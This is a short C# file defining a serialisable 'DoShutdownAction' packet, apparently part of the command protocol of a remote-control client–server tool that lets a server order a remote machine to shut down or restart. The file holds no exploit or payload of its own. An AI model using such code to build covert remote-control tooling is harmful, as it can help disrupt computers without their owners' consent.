using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoShutdownAction : IPacket
    {
        [ProtoMember(1)]
        public int Mode { get; set; }

        public DoShutdownAction()
        {
        }

        public DoShutdownAction(int mode)
        {
            this.Mode = mode;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}